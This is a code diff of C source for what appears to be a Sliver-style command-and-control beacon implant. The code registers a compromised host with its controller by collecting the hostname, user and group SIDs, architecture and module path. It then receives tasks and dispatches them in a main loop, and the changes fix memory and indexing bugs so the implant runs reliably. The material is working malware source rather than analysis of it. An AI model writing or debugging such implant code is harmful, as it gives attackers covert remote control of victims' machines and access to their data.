@@ -15,32 +15,33 @@ PBEACON_TASK UnmarshalBeaconTasks
 	DWORD dwNumberOfEnvelopes = 0;
 
 	for (i = 0; i < _countof(RecvElements); i++) {
-		RecvElements[i] = ALLOC(sizeof(PPBElement));
+		RecvElements[i] = ALLOC(sizeof(PBElement));
 		RecvElements[i]->dwFieldIdx = i + 1;
 	}
 
 	for (i = 0; i < _countof(EnvelopeElements); i++) {
-		EnvelopeElements[i] = ALLOC(sizeof(PPBElement));
+		EnvelopeElements[i] = ALLOC(sizeof(PBElement));
 		EnvelopeElements[i]->dwFieldIdx = i + 1;
 		EnvelopeElements[i]->Type = Varint;
 	}
 
-	RecvElements[0] = Bytes;
-	RecvElements[1] = RepeatedBytes;
-	RecvElements[2] = Varint;
+	RecvElements[0]->Type = Bytes;
+	RecvElements[1]->Type = RepeatedBytes;
+	RecvElements[2]->Type = Varint;
 	EnvelopeElements[2]->Type = Bytes;
 
 	pUnmarshaledData = UnmarshalStruct(RecvElements, _countof(RecvElements), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
 	pResult = ALLOC(sizeof(BEACON_TASK));
-	pResult->lpInstanceID = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
-	pResult->dwNextCheckin = ((PUINT64)pUnmarshaledData)[2];
+	/*pResult->lpInstanceID = DuplicateStrA(((PBUFFER)pUnmarshaledData[0])->pBuffer, 0);
+	pResult->dwNextCheckin = ((PUINT64)pUnmarshaledData)[2];*/
 	BufferList = (PBUFFER*)pUnmarshaledData[1];
 	dwNumberOfEnvelopes = *((PUINT64)BufferList);
 	
 	pResult->EnvelopeList = ALLOC(dwNumberOfEnvelopes * sizeof(PENVELOPE));
-	for (i = 1; i <= dwNumberOfEnvelopes; i++) {
+	pResult->dwNumberOfEnvelopes = dwNumberOfEnvelopes;
+	for (i = 0; i < dwNumberOfEnvelopes; i++) {
 		pResult->EnvelopeList[i] = ALLOC(sizeof(ENVELOPE));
-		pUnmarshaledEnvelope = UnmarshalStruct(EnvelopeElements, _countof(EnvelopeElements), BufferList[i]->pBuffer, BufferList[i]->cbBuffer, NULL);
+		pUnmarshaledEnvelope = UnmarshalStruct(EnvelopeElements, _countof(EnvelopeElements), BufferList[i + 1]->pBuffer, BufferList[i + 1]->cbBuffer, NULL);
 		pResult->EnvelopeList[i]->uID = (UINT64)pUnmarshaledEnvelope[0];
 		pResult->EnvelopeList[i]->uType = (UINT64)pUnmarshaledEnvelope[1];
 		pResult->EnvelopeList[i]->uUnknownMessageType = (UINT64)pUnmarshaledEnvelope[3];
@@ -88,6 +89,7 @@ PENVELOPE MarshalBeaconTasks
 	PBUFFER* MarshaledTasks = NULL;
 	DWORD i = 0;
 
+	SecureZeroMemory(BeaconTasksElements, sizeof(BeaconTasksElements));
 	BeaconTasksElements[0] = CreateBytesElement(pBeacon->szInstanceID, lstrlenA(pBeacon->szInstanceID), 1);
 	if (dwNextCheckin > 0) {
 		BeaconTasksElements[2] = CreateVarIntElement(dwNextCheckin, 3);
@@ -108,10 +110,7 @@ PENVELOPE MarshalBeaconTasks
 	pResult->pData = BufferMove(pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
 	pFinalElement->pMarshalledData = NULL;
 CLEANUP:
-	if (MarshaledTasks != NULL) {
-		FREE(MarshaledTasks);
-	}
-
+	FREE(MarshaledTasks);
 	FreeElement(pFinalElement);
 
 	return pResult;
@@ -248,43 +247,17 @@ BOOL BeaconRegister
 	pFinalElement->pMarshalledData = NULL;
 	Result = pBeacon->Send(pBeacon->pGlobalConfig, pBeacon->lpClient, &RegisterEnvelope);
 CLEANUP:
-	if (lpHostName != NULL) {
-		FREE(lpHostName);
-	}
-
-	if (lpUUID != NULL) {
-		FREE(lpUUID);
-	}
-
-	if (lpFullQualifiedName != NULL) {
-		FREE(lpFullQualifiedName);
-	}
-
-	if (lpUserSid != NULL) {
-		FREE(lpUserSid);
-	}
-
-	if (lpGroupSid != NULL) {
-		FREE(lpGroupSid);
-	}
-
-	if (lpArch != NULL) {
-		FREE(lpArch);
-	}
-
-	if (lpModulePath != NULL) {
-		FREE(lpModulePath);
-	}
-
-	if (lpVersion != NULL) {
-		FREE(lpVersion);
-	}
-
-	if (lpLocaleName != NULL) {
-		FREE(lpLocaleName);
-	}
-
+	FREE(lpHostName);
+	FREE(lpUUID);
+	FREE(lpFullQualifiedName);
+	FREE(lpUserSid);
+	FREE(lpGroupSid);
+	FREE(lpArch);
+	FREE(lpModulePath);
+	FREE(lpVersion);
+	FREE(lpLocaleName);
 	FreeElement(pFinalElement);
+
 	return Result;
 }
 
@@ -305,6 +278,7 @@ PENVELOPE* BeaconHandleTaskList
 		SystemTaskHandler = HandlerList[Tasks[i]->uType];
 		if (SystemTaskHandler != NULL) {
 			pResult[i] = SystemTaskHandler(Tasks[i]);
+			continue;
 		}
 
 		// Cac handler con lai
@@ -314,9 +288,7 @@ PENVELOPE* BeaconHandleTaskList
 		pResult[i]->uUnknownMessageType = 1;
 	}
 
-	if (HandlerList != NULL) {
-		FREE(HandlerList);
-	}
+	FREE(HandlerList);
 
 	return pResult;
 }
@@ -329,10 +301,7 @@ VOID FreeBeaconTask
 	DWORD i = 0;
 
 	if (pBeaconTask != NULL) {
-		if (pBeaconTask->lpInstanceID != NULL) {
-			FREE(pBeaconTask->lpInstanceID);
-		}
-
+		FREE(pBeaconTask->lpInstanceID);
 		if (pBeaconTask->EnvelopeList != NULL) {
 			for (i = 0; i < pBeaconTask->dwNumberOfEnvelopes; i++) {
 				FreeEnvelope(pBeaconTask->EnvelopeList[i]);
@@ -459,7 +428,7 @@ VOID BeaconMainLoop
 
 		FreeEnvelope(pNextCheckinEnvelope);
 		pRecvEnvelope = pBeacon->Receive(pBeacon->pGlobalConfig, pBeacon->lpClient);
-		if (pRecvEnvelope != NULL) {
+		if (pRecvEnvelope != NULL && pRecvEnvelope->pData != NULL) {
 			BeaconTask = UnmarshalBeaconTasks(pRecvEnvelope);
 			FreeEnvelope(pRecvEnvelope);
 
@@ -469,7 +438,11 @@ VOID BeaconMainLoop
 			pWrapper->hEvent = hEvent;
 			pWrapper->pBeacon = pBeacon;
 
-			FREE(BeaconTask->lpInstanceID);
+			if (BeaconTask->lpInstanceID != NULL) {
+				FREE(BeaconTask->lpInstanceID);
+				BeaconTask->lpInstanceID = NULL;
+			}
+
 			FREE(BeaconTask);
 			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
 			if (pWork == NULL) {
@@ -487,7 +460,6 @@ CLEANUP:
 	FreeSliverThreadPool(pSliverPool);
 	FreeBeaconTask(BeaconTask);
 	FreeEnvelope(pNextCheckinEnvelope);
-	
 
 	if (hEvent != NULL) {
 		CloseHandle(hEvent);
@@ -521,9 +493,7 @@ PSLIVER_BEACON_CLIENT BeaconInit
 #endif
 
 CLEANUP:
-	if (lpUuid != NULL) {
-		FREE(lpUuid);
-	}
+	FREE(lpUuid);
 
 	return pBeacon;
 }
